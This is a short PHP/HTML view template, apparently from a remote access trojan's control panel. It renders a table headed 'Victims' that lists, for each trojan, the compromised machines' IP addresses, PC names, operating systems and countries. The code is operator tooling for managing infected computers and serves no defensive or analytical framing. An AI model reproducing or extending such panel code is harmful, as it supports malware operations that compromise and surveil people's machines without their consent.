<h2>Victims</h2>
<table class="table table-bordered table-striped">
    <thead>
        <tr>
            <th>#</th>
            <th>Rat</th>
            <th>Ip Address</th>
            <th>PC Name</th>
            <th>OS</th>
            <th>Country</th>
        </tr>
    </thead>
    <tbody>
<?php
$i=1;
        foreach($rats as $rat){
        $victims=new Victims();
        $victims=$victims->find('rat_id='.$rat->id);
        foreach($victims as $victim){
        $victim_info=new VictimInfo();
        $victim_info=$victim_info->findfirst("victim_id=".$victim->id);
        
        
        
?>        <tr> 
            <td><?=$i;?></td>
            <td><?=$rat->name;?></td>
            <td><?=$victim_info->ip_address;?></td>
            <td><?=$victim_info->pc_name;?></td>
            <td><?=$victim_info->os;?></td>
            <td><?=$victim_info->country;?></td>
        </tr>
        <?php
        $i++;
        }}
        ?>
    </tbody>
</table>

